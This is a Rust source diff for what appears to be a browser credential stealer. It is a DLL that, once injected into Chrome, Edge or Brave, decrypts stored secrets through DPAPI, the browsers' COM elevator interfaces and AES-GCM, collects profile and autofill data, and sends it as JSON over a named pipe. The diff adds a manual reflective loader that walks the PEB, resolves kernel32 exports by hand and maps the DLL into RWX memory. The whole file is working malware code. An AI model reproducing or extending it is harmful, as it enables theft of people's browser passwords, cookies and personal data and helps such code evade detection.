@@ -4,6 +4,7 @@ use serde_json::Value;
 use std::ffi::OsStr;
 use std::fs;
 use std::io::Write;
+#[cfg(windows)]
 use std::os::windows::ffi::OsStrExt;
 use std::path::{Path, PathBuf};
 use std::ptr;
@@ -27,8 +28,9 @@ struct ProfileData {
     autofill: Vec<AutofillData>,
 }
 
+#[cfg(windows)]
 use winapi::{
-    shared::{guiddef::GUID, minwindef::UINT, wtypes::BSTR},
+    shared::{guiddef::GUID, minwindef::{UINT, WORD, DWORD, BYTE, LPVOID}, wtypes::BSTR},
     um::{
         combaseapi::{CoCreateInstance, CoInitializeEx, CoSetProxyBlanket, CoUninitialize},
         objbase::COINIT_APARTMENTTHREADED,
@@ -41,6 +43,42 @@ use winapi::{
     },
     ctypes::c_void,
 };
+
+#[cfg(not(windows))]
+#[allow(non_snake_case, non_camel_case_types)]
+pub mod winapi_stubs {
+    pub use std::ffi::c_void;
+    #[repr(C)] pub struct GUID { pub Data1: u32, pub Data2: u16, pub Data3: u16, pub Data4: [u8; 8] }
+    pub type UINT = u32;
+    pub type WORD = u16;
+    pub type DWORD = u32;
+    pub type BYTE = u8;
+    pub type LPVOID = *mut c_void;
+    pub type BSTR = *mut u16;
+    pub const DLL_PROCESS_ATTACH: u32 = 1;
+    pub const GENERIC_WRITE: u32 = 0x40000000;
+    pub const OPEN_EXISTING: u32 = 3;
+    pub const INVALID_HANDLE_VALUE: *mut c_void = -1isize as *mut c_void;
+    #[repr(C)] pub struct DATA_BLOB { pub cbData: u32, pub pbData: *mut u8 }
+    pub mod winbase { pub unsafe fn LocalFree(_: *mut super::c_void) -> *mut super::c_void { std::ptr::null_mut() } }
+    pub mod errhandlingapi { pub unsafe fn GetLastError() -> u32 { 0 } }
+    pub mod libloaderapi { pub unsafe fn GetModuleFileNameW(_: *mut super::c_void, _: *mut u16, _: u32) -> u32 { 0 } }
+    pub mod handleapi { pub unsafe fn CloseHandle(_: *mut super::c_void) -> i32 { 0 } }
+    pub unsafe fn CoInitializeEx(_: *mut c_void, _: u32) -> i32 { 0 }
+    pub unsafe fn CoUninitialize() {}
+    pub unsafe fn CoCreateInstance(_: *const GUID, _: *mut c_void, _: u32, _: *const GUID, _: *mut *mut c_void) -> i32 { -1 }
+    pub unsafe fn CoSetProxyBlanket(_: *mut c_void, _: u32, _: u32, _: *mut c_void, _: u32, _: u32, _: *mut c_void, _: u32) -> i32 { 0 }
+    pub unsafe fn SysAllocStringByteLen(_: *const i8, _: u32) -> BSTR { std::ptr::null_mut() }
+    pub unsafe fn SysFreeString(_: BSTR) {}
+    pub unsafe fn SysStringByteLen(_: BSTR) -> u32 { 0 }
+    pub unsafe fn CryptUnprotectData(_: *mut DATA_BLOB, _: *mut c_void, _: *mut c_void, _: *mut c_void, _: *mut c_void, _: u32, _: *mut DATA_BLOB) -> i32 { 0 }
+    pub unsafe fn CreateFileW(_: *const u16, _: u32, _: u32, _: *mut c_void, _: u32, _: u32, _: *mut c_void) -> *mut c_void { INVALID_HANDLE_VALUE }
+    pub unsafe fn WriteFile(_: *mut c_void, _: *const c_void, _: u32, _: *mut u32, _: *mut c_void) -> i32 { 0 }
+    pub unsafe fn VirtualAlloc(_: LPVOID, _: usize, _: u32, _: u32) -> LPVOID { std::ptr::null_mut() }
+}
+
+#[cfg(not(windows))]
+use winapi_stubs::*;
 
 use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
 
@@ -81,6 +119,36 @@ struct IEdgeElevatorVTbl {
     DecryptData: unsafe extern "system" fn(*mut c_void, BSTR, *mut BSTR, *mut u32) -> i32,
 }
 
+#[repr(C)]
+struct IMAGE_DOS_HEADER {
+    e_magic: WORD, e_cblp: WORD, e_cp: WORD, e_crlc: WORD, e_cparhdr: WORD, e_minalloc: WORD, e_maxalloc: WORD,
+    e_ss: WORD, e_sp: WORD, e_csum: WORD, e_ip: WORD, e_cs: WORD, e_lfarlc: WORD, e_ovno: WORD,
+    e_res: [WORD; 4], e_oemid: WORD, e_oeminfo: WORD, e_res2: [WORD; 10], e_lfanew: i32,
+}
+#[repr(C)] #[allow(non_snake_case)]
+struct IMAGE_FILE_HEADER { Machine: WORD, NumberOfSections: WORD, TimeDateStamp: DWORD, PointerToSymbolTable: DWORD, NumberOfSymbols: DWORD, SizeOfOptionalHeader: WORD, Characteristics: WORD }
+#[repr(C)] struct IMAGE_DATA_DIRECTORY { VirtualAddress: DWORD, Size: DWORD }
+#[repr(C)] #[allow(non_snake_case)]
+struct IMAGE_OPTIONAL_HEADER64 {
+    Magic: WORD, MajorLinkerVersion: BYTE, MinorLinkerVersion: BYTE, SizeOfCode: DWORD, SizeOfInitializedData: DWORD, SizeOfUninitializedData: DWORD, AddressOfEntryPoint: DWORD,
+    BaseOfCode: DWORD, ImageBase: u64, SectionAlignment: DWORD, FileAlignment: DWORD, MajorOperatingSystemVersion: WORD, MinorOperatingSystemVersion: WORD, MajorImageVersion: WORD,
+    MinorImageVersion: WORD, MajorSubsystemVersion: WORD, MinorSubsystemVersion: WORD, Win32VersionValue: DWORD, SizeOfImage: DWORD, SizeOfHeaders: DWORD, CheckSum: DWORD,
+    Subsystem: WORD, DllCharacteristics: WORD, SizeOfStackReserve: u64, SizeOfStackCommit: u64, SizeOfHeapReserve: u64, SizeOfHeapCommit: u64, LoaderFlags: DWORD, NumberOfRvaAndSizes: DWORD,
+    DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
+}
+#[repr(C)] #[allow(non_snake_case)]
+struct IMAGE_NT_HEADERS64 { Signature: DWORD, FileHeader: IMAGE_FILE_HEADER, OptionalHeader: IMAGE_OPTIONAL_HEADER64 }
+#[repr(C)] #[allow(non_snake_case)]
+struct IMAGE_SECTION_HEADER { Name: [BYTE; 8], VirtualSize: DWORD, VirtualAddress: DWORD, SizeOfRawData: DWORD, PointerToRawData: DWORD, PointerToRelocations: DWORD, PointerToLinenumbers: DWORD, NumberOfRelocations: WORD, NumberOfLinenumbers: WORD, Characteristics: DWORD }
+#[repr(C)] #[allow(non_snake_case)]
+struct IMAGE_EXPORT_DIRECTORY { Characteristics: DWORD, TimeDateStamp: DWORD, MajorVersion: WORD, MinorVersion: WORD, Name: DWORD, Base: DWORD, NumberOfFunctions: DWORD, NumberOfNames: DWORD, AddressOfFunctions: DWORD, AddressOfNames: DWORD, AddressOfNameOrdinals: DWORD }
+#[repr(C)] #[allow(non_snake_case)]
+struct IMAGE_IMPORT_DESCRIPTOR { OriginalFirstThunk: DWORD, TimeDateStamp: DWORD, ForwarderChain: DWORD, Name: DWORD, FirstThunk: DWORD }
+#[repr(C)] struct IMAGE_BASE_RELOCATION { VirtualAddress: DWORD, SizeOfBlock: DWORD }
+
+fn to_wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }
+
+#[allow(dead_code)]
 fn log_message(msg: &str) -> Result<(), std::io::Error> {
     let desktop = std::env::var("USERPROFILE").map(|p| PathBuf::from(p).join("Desktop").join("log.txt")).unwrap_or_else(|_| PathBuf::from("log.txt"));
     let mut file = fs::OpenOptions::new().create(true).append(true).open(desktop)?;
@@ -94,9 +162,8 @@ fn decrypt_dpapi(data: &[u8]) -> Result<Vec<u8>, String> {
         let mut output = DATA_BLOB { cbData: 0, pbData: ptr::null_mut() };
         if CryptUnprotectData(&mut input, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, &mut output) != 0 {
             let result = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
-            winapi::um::winbase::LocalFree(output.pbData as *mut c_void);
-            Ok(result)
-        } else { Err(format!("DPAPI Error: {}", winapi::um::errhandlingapi::GetLastError())) }
+            winbase::LocalFree(output.pbData as *mut c_void); Ok(result)
+        } else { Err(format!("DPAPI Error: {}", errhandlingapi::GetLastError())) }
     }
 }
 
@@ -107,17 +174,17 @@ fn decrypt_with_elevator(encrypted_blob: &[u8], browser: Browser) -> Result<Vec<
         Browser::Brave => (CLSID_BRAVE_ELEVATOR, vec![IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1]),
     };
     unsafe {
-        let hr = CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
-        if hr < 0 && hr as u32 != 0x80010106 { return Err("CoInit failed".into()); }
+        let hr = CoInitializeEx(ptr::null_mut(), 0x2);
+        if hr < 0 && (hr as u32) != 0x80010106 { return Err("CoInit failed".into()); }
         let result = (|| {
             let mut elevator_ptr: *mut c_void = ptr::null_mut();
-            let mut hr = -1;
+            let mut hr = -1i32;
             for iid in iids {
-                hr = CoCreateInstance(&clsid, ptr::null_mut(), winapi::shared::wtypesbase::CLSCTX_LOCAL_SERVER, &iid, &mut elevator_ptr);
+                hr = CoCreateInstance(&clsid, ptr::null_mut(), 0x4, &iid, &mut elevator_ptr);
                 if hr >= 0 { break; }
             }
             if hr < 0 { return Err(format!("CoCreateInstance failed: 0x{:08X}", hr as u32)); }
-            let _ = CoSetProxyBlanket(elevator_ptr as *mut winapi::um::unknwnbase::IUnknown, 10, 0, ptr::null_mut(), 6, 3, ptr::null_mut(), 0x40);
+            let _ = CoSetProxyBlanket(elevator_ptr, 10, 0, ptr::null_mut(), 6, 3, ptr::null_mut(), 0x40);
             let bstr_enc = SysAllocStringByteLen(encrypted_blob.as_ptr() as *const i8, encrypted_blob.len() as UINT);
             let mut bstr_dec: BSTR = ptr::null_mut();
             let mut last_error: u32 = 0;
@@ -129,16 +196,10 @@ fn decrypt_with_elevator(encrypted_blob: &[u8], browser: Browser) -> Result<Vec<
                 ((*vtable).DecryptData)(elevator_ptr, bstr_enc, &mut bstr_dec, &mut last_error)
             };
             SysFreeString(bstr_enc);
-            if hr < 0 {
-                let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
-                ((*vtable).Release)(elevator_ptr);
-                return Err(format!("DecryptData failed: 0x{:08X}", hr as u32));
-            }
+            if hr < 0 { (std::mem::transmute::<_, unsafe extern "system" fn(*mut c_void) -> u32>(**(elevator_ptr as *const *const *const c_void).add(2)))(elevator_ptr); return Err(format!("DecryptData failed: 0x{:08X}", hr as u32)); }
             let res = std::slice::from_raw_parts(bstr_dec as *const u8, SysStringByteLen(bstr_dec) as usize).to_vec();
             SysFreeString(bstr_dec);
-            let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
-            ((*vtable).Release)(elevator_ptr);
-            Ok(res)
+            (std::mem::transmute::<_, unsafe extern "system" fn(*mut c_void) -> u32>(**(elevator_ptr as *const *const *const c_void).add(2)))(elevator_ptr); Ok(res)
         })();
         if hr >= 0 { CoUninitialize(); }
         result
@@ -154,7 +215,7 @@ fn aes_gcm_decrypt(key: &[u8], data: &[u8]) -> Vec<u8> {
 
 fn get_browser() -> Browser {
     let mut path = [0u16; 260];
-    unsafe { winapi::um::libloaderapi::GetModuleFileNameW(ptr::null_mut(), path.as_mut_ptr(), 260); }
+    unsafe { libloaderapi::GetModuleFileNameW(ptr::null_mut(), path.as_mut_ptr(), 260); }
     let s = String::from_utf16_lossy(&path).to_lowercase();
     if s.contains("msedge.exe") { Browser::Edge } else if s.contains("brave.exe") { Browser::Brave } else { Browser::Chrome }
 }
@@ -272,19 +333,19 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     unsafe {
-        let pipe_name: Vec<u16> = OsStr::new(r"\\.\pipe\chrome_extractor").encode_wide().chain(Some(0)).collect();
-        let mut handle = INVALID_HANDLE_VALUE;
+        let pipe_name = to_wide(r"\\.\pipe\chrome_extractor");
+        let mut handle = CreateFileW(pipe_name.as_ptr(), GENERIC_WRITE, 0, ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut());
         for _ in 0..30 {
-            handle = CreateFileW(pipe_name.as_ptr(), GENERIC_WRITE, 0, ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut());
             if handle != INVALID_HANDLE_VALUE { break; }
             thread::sleep(std::time::Duration::from_millis(200));
+            handle = CreateFileW(pipe_name.as_ptr(), GENERIC_WRITE, 0, ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut());
         }
         if handle != INVALID_HANDLE_VALUE {
             if let Ok(s) = serde_json::to_vec(&collected) {
                 let mut written = 0;
                 WriteFile(handle, s.as_ptr() as *const _, s.len() as u32, &mut written, ptr::null_mut());
             }
-            winapi::um::handleapi::CloseHandle(handle);
+            handleapi::CloseHandle(handle);
         }
     }
     Ok(())
@@ -292,6 +353,99 @@ fn do_work() -> Result<(), Box<dyn std::error::Error>> {
 
 #[no_mangle]
 pub extern "system" fn DllMain(_: *mut c_void, reason: u32, _: *mut c_void) -> i32 {
-    if reason == DLL_PROCESS_ATTACH { thread::spawn(|| { let _ = do_work(); }); }
+    if reason == 1 { thread::spawn(|| { let _ = do_work(); }); }
     1
+}
+
+#[inline(always)]
+unsafe fn get_kernel32_base() -> usize {
+    let mut peb: usize = 0;
+    #[cfg(target_arch = "x86_64")] std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+    #[cfg(target_arch = "x86")] std::arch::asm!("mov {}, fs:[0x30]", out(reg) peb);
+    if peb == 0 { return 0; }
+    let ldr = *(peb as *const usize).add(3);
+    let mut list_entry = *(ldr as *const usize).add(4);
+    loop {
+        let base = *(list_entry as *const usize).add(6);
+        let name_ptr = *(list_entry as *const usize).add(12) as *const u16;
+        if !name_ptr.is_null() {
+            let mut i = 0; let mut matches = true;
+            let target = [b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16, b'e' as u16, b'l' as u16, b'3' as u16, b'2' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16];
+            while i < target.len() {
+                let mut c = *name_ptr.add(i); if c >= b'A' as u16 && c <= b'Z' as u16 { c += 32; }
+                if c != target[i] { matches = false; break; }
+                i += 1;
+            }
+            if matches { return base; }
+        }
+        list_entry = *(list_entry as *const usize);
+    }
+}
+
+#[inline(always)]
+unsafe fn get_proc_address(module: usize, name: &[u8]) -> usize {
+    let dos_header = module as *const IMAGE_DOS_HEADER;
+    let nt_headers = (module + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
+    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress;
+    if export_dir_rva == 0 { return 0; }
+    let export_dir = (module + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;
+    let names = (module + (*export_dir).AddressOfNames as usize) as *const u32;
+    let ordinals = (module + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
+    let functions = (module + (*export_dir).AddressOfFunctions as usize) as *const u32;
+    for i in 0..(*export_dir).NumberOfNames {
+        let current_name = (module + *names.add(i as usize) as usize) as *const i8;
+        let mut j = 0; let mut matches = true;
+        while j < name.len() { if *current_name.add(j) != name[j] as i8 { matches = false; break; } j += 1; }
+        if matches && *current_name.add(j) == 0 { return module + *functions.add(*ordinals.add(i as usize) as usize) as usize; }
+    }
+    0
+}
+
+#[no_mangle]
+pub unsafe extern "system" fn ReflectiveLoader(lp_parameter: *mut c_void) -> u32 {
+    let base = get_kernel32_base();
+    let load_library_a: unsafe extern "system" fn(*const i8) -> usize = std::mem::transmute(get_proc_address(base, b"LoadLibraryA\0"));
+    let get_proc_address_fn: unsafe extern "system" fn(usize, *const i8) -> usize = std::mem::transmute(get_proc_address(base, b"GetProcAddress\0"));
+    let virtual_alloc: unsafe extern "system" fn(LPVOID, usize, DWORD, DWORD) -> LPVOID = std::mem::transmute(get_proc_address(base, b"VirtualAlloc\0"));
+    let dll_base = lp_parameter as usize;
+    let dos_header = dll_base as *const IMAGE_DOS_HEADER;
+    let nt_headers = (dll_base + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
+    let new_base = virtual_alloc(ptr::null_mut(), (*nt_headers).OptionalHeader.SizeOfImage as usize, 0x3000, 0x40);
+    ptr::copy_nonoverlapping(dll_base as *const u8, new_base as *mut u8, (*nt_headers).OptionalHeader.SizeOfHeaders as usize);
+    let section_header_start = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
+    for i in 0..(*nt_headers).FileHeader.NumberOfSections {
+        let section = &*section_header_start.add(i as usize);
+        if section.SizeOfRawData > 0 { ptr::copy_nonoverlapping((dll_base + section.PointerToRawData as usize) as *const u8, (new_base as usize).wrapping_add(section.VirtualAddress as usize) as *mut u8, section.SizeOfRawData as usize); }
+    }
+    let reloc_dir = &(*nt_headers).OptionalHeader.DataDirectory[5];
+    if reloc_dir.Size > 0 {
+        let delta = (new_base as isize).wrapping_sub((*nt_headers).OptionalHeader.ImageBase as isize);
+        let mut current_reloc = (new_base as usize).wrapping_add(reloc_dir.VirtualAddress as usize) as *const IMAGE_BASE_RELOCATION;
+        while (*current_reloc).SizeOfBlock > 0 {
+            let count = ((*current_reloc).SizeOfBlock as usize - std::mem::size_of::<IMAGE_BASE_RELOCATION>()) / 2;
+            let entries = (current_reloc as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;
+            for i in 0..count {
+                let entry = *entries.add(i);
+                if entry >> 12 == 10 { *((new_base as usize).wrapping_add((*current_reloc).VirtualAddress as usize).wrapping_add((entry & 0xFFF) as usize) as *mut isize) += delta; }
+            }
+            current_reloc = (current_reloc as usize).wrapping_add((*current_reloc).SizeOfBlock as usize) as *const IMAGE_BASE_RELOCATION;
+        }
+    }
+    let import_dir = &(*nt_headers).OptionalHeader.DataDirectory[1];
+    if import_dir.Size > 0 {
+        let mut import_desc = (new_base as usize).wrapping_add(import_dir.VirtualAddress as usize) as *const IMAGE_IMPORT_DESCRIPTOR;
+        while (*import_desc).Name != 0 {
+            let lib_handle = load_library_a((new_base as usize).wrapping_add((*import_desc).Name as usize) as *const i8);
+            let mut thunk = (new_base as usize).wrapping_add((*import_desc).FirstThunk as usize) as *mut usize;
+            let mut original_thunk = if (*import_desc).OriginalFirstThunk != 0 { (new_base as usize).wrapping_add((*import_desc).OriginalFirstThunk as usize) as *const usize } else { thunk as *const usize };
+            while *original_thunk != 0 {
+                if *original_thunk & (1usize << (std::mem::size_of::<usize>() * 8 - 1)) != 0 { *thunk = get_proc_address_fn(lib_handle, (*original_thunk & 0xFFFF) as *const i8); }
+                else { *thunk = get_proc_address_fn(lib_handle, (new_base as usize).wrapping_add(*original_thunk).wrapping_add(2) as *const i8); }
+                thunk = thunk.add(1); original_thunk = original_thunk.add(1);
+            }
+            import_desc = import_desc.add(1);
+        }
+    }
+    (std::mem::transmute::<_, unsafe extern "system" fn(usize, u32, *mut c_void) -> i32>((new_base as usize).wrapping_add((*nt_headers).OptionalHeader.AddressOfEntryPoint as usize)))(new_base as usize, 1, ptr::null_mut());
+    0
 }
